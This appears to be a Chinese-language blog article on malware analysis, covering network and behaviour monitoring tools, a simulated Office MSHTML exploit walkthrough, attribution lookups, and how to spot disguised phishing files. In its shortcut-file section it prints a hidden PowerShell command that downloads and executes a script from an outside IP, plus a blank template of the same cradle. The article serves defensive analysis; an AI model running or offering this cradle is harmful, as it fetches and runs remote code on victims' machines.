<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/EsgFGQe8vViSM9zPia6qdg)

**

**内容概览**  

-----------

**

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjkRGJlmMdLMkqlIicSVUwkHqONUbOXMCLIs25cMdPSic1YoKMWctVibbJQ/640?wx_fmt=jpeg)

**背景**
======

**恶意软件分析技术的市场**
---------------

如今，恶意软件分析已是信息安全领域的一个整体产业：

发布保护产品的反病毒引擎实验室，高度专业化的专家小组，甚至恶意软件编写者本身也参与其中，他们争夺一个潜在的客户 --"受害者"。

**常见的分析技术**
-----------

*   静态恶意软件分析
    

静态恶意软件分析在不主动运行恶意软件代码的情况下查找可能损害系统的文件，使其成为暴露恶意库或打包文件的安全工具。静态恶意软件分析可以发现有关恶意软件性质的线索，例如文件名、哈希、IP 地址、域和文件头数据。可以使用各种工具（例如网络分析器）观察恶意软件。

*   动态恶意软件分析
    

动态恶意软件分析使用沙盒，沙盒是一个安全、隔离的虚拟环境，您可以在其中运行可疑的危险代码。安全专业人员可以密切监视沙箱中的恶意软件，而不必担心感染系统或网络的其余部分，从而使他们能够收集有关恶意软件的更多信息。

*   混合恶意软件分析
    

混合恶意软件分析结合了静态和动态技术。例如，如果恶意代码对计算机的内存进行更改，则动态分析可以检测到该活动。然后，静态分析可以准确确定进行了哪些更改。

**常见的检测工具展示**
-------------

### **网络分析工具**

*   NetLimiter
    

官网：https://www.netlimiter.com/

可通过此工具监测程序的网络通讯信息，以方便进一步分析

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjiboVU2fwljgtZBr0XrYOLq4MnVKRl7tA0GBYY7HiakF56CKZVRj9CIfg/640?wx_fmt=jpeg)

*   CurrPorts
    

官网：https://www.nirsoft.net/utils/cports.html

可通过此工具显示本地计算机上所有当前打开的 TCP/IP 和 UDP 端口的列表。对于列表中的每个端口，还显示打开该端口的进程的信息，包括进程名称、进程的完整路径、进程的版本信息（产品名称、文件描述等）、进程的创建时间以及创建该进程的用户。此外，CurrPorts 允许你关闭不需要的 TCP 连接，杀死打开端口的进程，并将 TCP/UDP 端口信息保存到 HTML 文件、XML 文件或以制表符分隔的文本文件中。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjIbShMhWYSjYiblTxrE1cquBuYBRO0S9TZuwPKtLz7pDVb12Gx8u8uLw/640?wx_fmt=jpeg)

*   TeaPot
    

可通过此工具监测目标系统的 DNS 解析，可有效应用于对 APT 远控木马的检测。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5Ygjl0ZQbeMibwJQx1bmQCeLmXOW5yOCKhtWzHZQmk58kI7lia2fmLNILOwA/640?wx_fmt=jpeg)

*   HTTPDebuger
    

官网：https://www.httpdebugger.com/

可通过此攻击 http 与 https 数据

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjoWAb9ERzTQlOjmmDXUdYdHibRACOtiaibdPURPE3Iic13qoHH7A9qMrVmw/640?wx_fmt=jpeg)

### **行为监控工具**

*   DiffView
    

官网：https://www.adlice.com/diffview/

可通过此工具追踪一个程序在你系统上所做的修改或一些操作进行监控

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjkgvxVVMXa3t9wMZdaMZRQnRHGQda8Ymv8SlsYSOkycQ1jz2LFQsDGQ/640?wx_fmt=jpeg)

*   火绒剑
    

官网：https://www.huorong.cn/

可通过此工具在如下图所展示的角度分析程序运行后做了什么，以分析是否为恶意程序以及进行辅助分析工作

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5Ygjm435wcez2jqPgW6Uj2mTnJlNia2SZQmiccyZZ15WzpUXEHibfwESCiceBg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjMIISxvRY4kf3x2D2jmNweNxk0xE0kibmXzQK7FwWGiaCWtyQKF8evHCw/640?wx_fmt=jpeg)

*   Comodo
    

可通过此工具的 HIPS 与防火墙功能监测程序运行后做了什么，以进行分析

https://www.comodo.com/home/internet-security/free-internet-security.php

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjJ179Z0w9J2ibeuJ5k6BERoIutNwEpVjTgo9yYbEtYeDH1nicPibKYR2qw/640?wx_fmt=jpeg)

### **反编译与调试工具**

*   GDA 与 Frida
    

http://www.gda.wiki:9090/

https://frida.re/

通过 GDA 与 Frida 来分析 APK 是否存在恶意行为

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjBtIASUF14QCOHh9ibjDibDkwyHiafx0oaH1kickdo323MrXN3g3r9TslQA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5Ygj9BC7fS64Rs9pkTXhma0wG8ceicplZzkB2PV3eH1w5YicyfnjrFDH9zjg/640?wx_fmt=jpeg)

*   x64dbg
    

https://x64dbg.com/

可通过此工具深入分析程序的执行情况以及运行原理

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5Ygj6QrunpScL3qwABWxs2p66icKNNyhBgicAWLHgo7hvJEJjvkOG0EABMfQ/640?wx_fmt=jpeg)

**知识扩展**
--------

### **思路**

一个恶意软件分析思路图展示，如下图展示了三个编码级别

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjiaanBlZewHN8wPIsev8QGKKZIcd41VibuATbRA9hcO1WGd0D7pdjrLfA/640?wx_fmt=jpeg)

恶意软件作者：使用高级语言编写恶意程序

计算机：CPU 识别代码进行执行

恶意软件分析人员：通过反编译手段进行分析

### **发包函数**

针对软件的网络信息常针对底层运行原理，通过拦截发布函数进行分析

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5Ygj3lftAwtH1XnKCQd2MEics5nwXMaPsjSGe2RBIBLgStW9JKSM4pwWqJw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjydpdeYSPNbKSUR1KkdwMwnm59mU3Y476RuNibsstwfibOmmREa0EANwg/640?wx_fmt=jpeg)

WSPSend 函数在一个连接的套接字上发送数据。

WSPSendTo 函数使用重叠的 I/O 将数据发送到一个特定的目的地。

WSPRecv 函数在一个套接字上接收数据。

WSPRecvFrom 函数接收一个数据报并存储源地址。

**漏洞利用类钓鱼**
-----------

**模拟**
------

打开 Word 发现有下载连接

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjVu5TmHYlcE5WJBqTEPrGaXcbmMk58Gr3uwWk0bEVTe6fb5BlUjg98Q/640?wx_fmt=jpeg)

模拟恶意行为打开了计算器

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjnCz10S0zM6laPawgjSttibTnq1c2iaJoqw4ticlaaU3MV9VPppvoqGfow/640?wx_fmt=jpeg)

### **真实背景利用案例**

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjP5lyR56w0Pcq3Pv4acV1Cqm5khGoqSMzTF3EzfSD35ibmficlf61n8dg/640?wx_fmt=jpeg)

该漏洞存在于 MSHTML，即 Internet Explorer 的引擎。虽然现在很少有人使用 IE（甚至微软也强烈建议改用其较新的浏览器 Edge），但这个旧的浏览器仍然是现代操作系统的一个组成部分，而且其他一些程序也使用其引擎来处理网络内容。特别是，微软的 Office 应用程序，如 Word 和 PowerPoint，都依赖它。

钓鱼邮件示例

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjXkTP5zDIZpoO7IiaB6LZb5VwQEZto6nezwJibeYFTqpcjYjRjfeccqFA/640?wx_fmt=jpeg)

自该漏洞发布以来，安全研究人员在 Twitter 上警告说，尽管微软 Office 的 “保护视图” 功能会阻止该漏洞，但这是多么危险。当 Office 打开一个文档时，它会检查它是否被标记为 “网络标记”（MoTW），这意味着它来自于互联网。如果这个标签存在，微软将以只读模式打开文档，有效地阻止了该漏洞，除非用户点击 “启用编辑 ” 按钮。

但历史表明，许多用户忽略了这一警告，还是点击了 "启用编辑" 按钮。

但还有有许多方法可以使文件不收到 MoTW 标志，从而有效地否定了这种防御。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjsdBw7zoqXtvRBL93icibxDpwO10fISaLVR4kvtAiaoGsjibejMue7gSdBQ/640?wx_fmt=jpeg)

### **模拟分析**

*   网络分析示例
    

发起程序 -

WINWORD.EXE *64 位  
请求地址 -

http://192.168.86.144/  
http://192.168.86.144/word.cab

解析：cab 是 windows 的压缩格式

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjoWAb9ERzTQlOjmmDXUdYdHibRACOtiaibdPURPE3Iic13qoHH7A9qMrVmw/640?wx_fmt=jpeg)

*   行为监控分析示例
    

正常：就是打开一个 word 文档

可疑：调用了控制面板程序 control.exe

并通过控制面板执行临时文件夹下名为 msword.inf 配置文件，之后通过运行 cmd 程序打开计算器程序 calc.exe(这里代指恶意程序）

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjRWsMIwNcCibpz21ZBDtMnHxlg3KXUtvKRia4tVDeMQ1XPyiakL8g4WeiaQ/640?wx_fmt=jpeg)

*   解包查看
    

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjbKG6ic0UQSYSZhTBlOWzncVcdQfDxaNJ9miaXGoACvTmicFW6czjetPrg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjS4GLafZTqYvOhkYib3a6tuiajIQrelqiaKHV1Ml6IMdRXWah5J1ib09mibA/640?wx_fmt=jpeg)

结合之前网络分析访问此地址后跳转下载可疑文件

*   下载分析
    

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjmQ3VRWgiasPrUUp6GAiaZYwW2wQYibkOjsMDhfDy8FpyDeW7H508yXXgg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjqOicwvoMd2TNblejtndiaB1OLbmsf2uPtfK0nIyDibHqeNVLFxeibernhQ/640?wx_fmt=jpeg)

通过 control（控制面板）程序运行 msword.inf 脚本

INF 文件中包含硬件设备的信息或脚本以控制硬件操作。

*   解析
    

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjPkuJ712icUNKZEV5NfPVzUicjPLBJlSRDntGTBF6IIgJtFqtr0GzBQAA/640?wx_fmt=jpeg)

看到了计算器相关内容（calc.exe 这里代指恶意程序）

*   反汇编定位
    

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5Ygjzr59RedZDfmfAB8okbqqWNv1bk420w6pF9S1QeOrRXhiaVg3zAlxXIg/640?wx_fmt=jpeg)

关键函数运行完毕，恶意程序已成功加载

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5Ygjq9ZdP3Tu03icIBUTHibFpgibjGxuvlfAWHMj33rlf3UgBUjEJFSUlPZ5A/640?wx_fmt=jpeg)

进入查看（已加载恶意配置文件）

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjPblAvOy8t8IJCFab7RuzJpu8TBiadyJSLRQ5tU3EybEjBaRMQh57gTw/640?wx_fmt=jpeg)

ShellExecuteExW 函数（可通常此函数执行外部程序或打开文件）

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjvnwfPEKSvqsEbKqNcZb3Ihl1R3sdcLJXvPFWsOUBaXs0Adezd9tmPA/640?wx_fmt=jpeg)

rundll32.exe(rundll32.exe 用于在内存中运行 DLL 文件，

它们会在应用程序中被使用, 可用于在内存中执行恶意 dll)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjzRzuIps1bjFicntGjmwuGJJXaqubicHBHFP2zG750sXWSz1tOiaLhAm6w/640?wx_fmt=jpeg)

栈回溯

执行参数

**溯源**
======

常根据分析的数据如 IP、MD5、签名等等通过一些方法深入定位制作者

常用的一些工具

*   埃文
    

https://www.ipplus360.com/

可通过此工具进行 IP 定位

*   BestTrace
    

https://www.ipip.net/product/client.html

IP 归属快速查询

*   备案、Whois、威胁情报查询系统
    

https://beian.miit.gov.cn/#/Integrated/index

https://whois.aliyun.com/

https://ti.qianxin.com/

https://s.threatbook.com/

https://tix.qq.com/

https://ti.sangfor.com.cn/analysis-platform

**判断**
======

*   后缀名与显示的 logo
    

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5Ygjjsm8cIlat1HkNHGSQfcA8FbV8a3ibbPJTPQ9Upm03QUf95yX0bK9Oibg/640?wx_fmt=jpeg)

如图所示显示的是常见 pdf logo 但实际是可执行文件

*   文件类型
    

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjuThtG2OVAX81vFibl5GvteUQORE9OO4B5OSq6SicVHiaaGC50xWj1YFHg/640?wx_fmt=jpeg)

如图所示, 通过一些方法使其后缀名看起来正常，但实际是可执行文件，此类可通过属性文件类型信息查看

*   hash
    

例如，假设你有 20 个来源不明的文件，你能够使用它们的 MD5 值在 virscan、Virustotal 之类的查杀网站进行对比来识别它们的安全度

https://www.virscan.org/

https://www.virustotal.com/

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjtMJ1xgq2oXHw8iay9lKk64ibX7vMLZVdfEAuibMgOiaYliaE7521vLLlutQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjX7HtdZJ271LmF5UicRc97jSibKDFSPRgU130NmcPPKia12icxzdaiahTxZg/640?wx_fmt=jpeg)

*   时间戳
    

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5Ygj9c45Tmn3FaHcGt8huNus5eB6QHMQj1x9MPA0cRTaSgjCPRpgJmowxQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjZp3s9DiaC9EMH0j4rd9zpaicQgUNlRk5SQv4xsSXbnT4dLdeQon5ic3Lg/640?wx_fmt=jpeg)

如图所示 编译日期与版本信息差别过大

*   邮件信息
    

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjO0Jg16MZsHg9kYx9VaBerFtzsVTNIf7gEfbs6NFOONEf0KbGWmhMaA/640?wx_fmt=jpeg)

发件人与所属单位对比

*   打开判断
    

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjMUC8PaNVOCBrCMJvjUembnH924n1npA104ojK6CZmdliaEMNS9AnEcQ/640?wx_fmt=jpeg)

执行恶意宏代码，在 TEMP 目录释放 XLS 文件

然后通过 WMIC 启动恶意 XLS 文件

*   专业工具
    

https://github.com/emalderson/ThePhish

钓鱼邮件分析系统

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjnZibyAGNW6p3wVPFzXOic2qSPVnx860IoB3gErIzy6iam6iae7gnqt45sQ/640?wx_fmt=jpeg)

*   扫描
    

http://www.starwoodd.net/

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjrmV5W4wvnrDoNfgvofrlQaSK1ze9Nh5kJGHA0O0fE1fSLUzAHS6MHQ/640?wx_fmt=jpeg)

*   代码分析
    

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjFg42WticomLrebbibHCvr9iaF4bRnL8OvJBXGPt38oxDbXclclBaBUyyw/640?wx_fmt=jpeg)

分析其具体行为与作用对比

*   快捷方式
    

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjXVn83faibMmqQic03bXd0LATVFhrk1cRZ2iaWwCocropCJMmLX7mPP9ug/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjbibHZHOHTV1qm47OKQ12OncshYLwuZTpVgPsBvNld2KFVvKLB85KdsA/640?wx_fmt=jpeg)

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://120.48.85.228:80/favicon’))”

```

```
powershell.exe -nop -w hidden -c IEX (new-object net.webclient).downloadstring(‘’)
```

**案例讲解**
--------

*   快捷方式
    

网上找的样本进行分析，如下图所示，解包内容存在欺骗诱导行为

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjoGCsYzgH7u92kApnkVebkpH8dI6RpibgWBlNeiak9vqLv5Re5RkEppSw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5Ygj1xLVzqMgz7j7YKUrGwyDNGwia92TiaD7ibOs2uYoiaEJwmSk7rOgo24ASg/640?wx_fmt=jpeg)

*   标题诱导
    

查看属性与解混淆发现为恶意程序

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjKicezwEEGFJYru21NZf8Vjx5pTvrma10IJI7GDkhDEb9iasSqA5HsBjA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjPxcYAFSH9eklTRDXia0sgD8bibx6AG85BpGhgocTstJoztxVvWgCMyjw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjswyvrE4RZp2cLAQweZmAIIC51XNohOmw3crRTtTt5GsKDyQuiarV2ew/640?wx_fmt=jpeg)

*   执行监控
    

打开文档后发现有外联与执行程序行为

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjtZEh4vkJzFuQnVjmIkV2TS07LTWlyDENngRPbAKISF0NKLtRfQibogw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjjC9hJjvnfUUzkKiaGtAt2pAaTwxjoRYX40hCWMzqic1Mwibufv13M8RtA/640?wx_fmt=jpeg)

**网上分析示例**
----------

*   属性查看
    

在 PEstudio 中检查样本的属性，恶意软件被打包，所有的字符串都被加密了

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5Ygj7753Jy81XT7MXxMj5f6UPgicyZib3pW3PfLkx6ic5xUMg6PiauIsZ9zONw/640?wx_fmt=jpeg)

*   反编译逐步分析
    

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5Ygj0TRPCRt5ibStq5yib02iaUjhH0icNUtdnBFuEvqpP055K8McapNgHicvfiaA/640?wx_fmt=jpeg)

获取进程的名称，接着解密一些字符串，并将其中的两个字符串连接起来创建 EXE 文件的名称。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjBdlGMuH7Ciajl1kCRUyIBan6odC3TCBlibicIgBhvjePTO100ZL7DXKhg/640?wx_fmt=jpeg)

防止恶意程序自我感染的过程中，恶意软件会将进程的完整路径与解析的应用程序进行比较。如果它们相同，恶意软件将返回并结束此功能

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5Ygjsn9KcuhibdF2Mia33hRD3wRXsByvhp3RIhTRl1dlDCkiaVBAGQ0TnrWMA/640?wx_fmt=jpeg)

遍历信息

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjYBd0eicdibI2icmM4v1KchGz1WsMYJSr5Qxcy5yosyumQXeFSDc5QGOAg/640?wx_fmt=jpeg)

c2

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjcbFrVBxUP6pFcn7cYXeib3kjH0GzibhMibWlnBt77Ln6bFQPqUU9fOISQ/640?wx_fmt=jpeg)

内容过多这里不展示了，下图是总结与查杀规则

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5Ygjl9sA2hcctN9pdkfoTa9ag1ku2g8I5InicSwUnric01erB3iaNt0cku4dQ/640?wx_fmt=jpeg)

**查杀**
======

*   扫描查杀思路图
    

不同的环境不同的思路

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjhOSTugmQFqCricz0TlHMUbg1biaNgTXQxfkutEicEZPZuZBSValsOzJWA/640?wx_fmt=jpeg)

*   专业扫描工具
    

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjWH3g7MQSwMLN2DKEb9Kb8r6UTR0mF75O81uda3Jg0TOceMtdibaiasTw/640?wx_fmt=jpeg)

*   弱点扫描
    

用户帐户控制 (UAC) 有助于防止恶意软件损坏电脑，并且有助于组织部署易于管理的桌面。借助 UAC，应用和任务将始终在非管理员帐户的安全上下文中运行，除非管理员专门授予管理员级别的访问系统权限。UAC 可阻止自动安装未经授权的应用并防止意外更改系统设置。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjzjHTmicJfI06DfpFLrMPYNajXBQyZZOPibvXAuTMBLx5gwHpcVABkyZw/640?wx_fmt=jpeg)

**总结**
======

*   对于文件
    

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjfTEsMcbGdafGiaibN7lmOzcvWCFbsbib8aOHvicvu8b77SHqPZia3jdbxGw/640?wx_fmt=jpeg)

*   内存层防护与监控
    

针对攻击的多样化建议在内存层进行防护与监控，目前国内安芯网盾这方面看到过相关资料

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xkA3iaCzeYpp40AHvo3uotfgFc1al5YgjAiccibKOGWUFIxNyfNqMyvNxDYor4icF0UrZdG3f5ib9oTLnLZfRFNHIibw/640?wx_fmt=jpeg)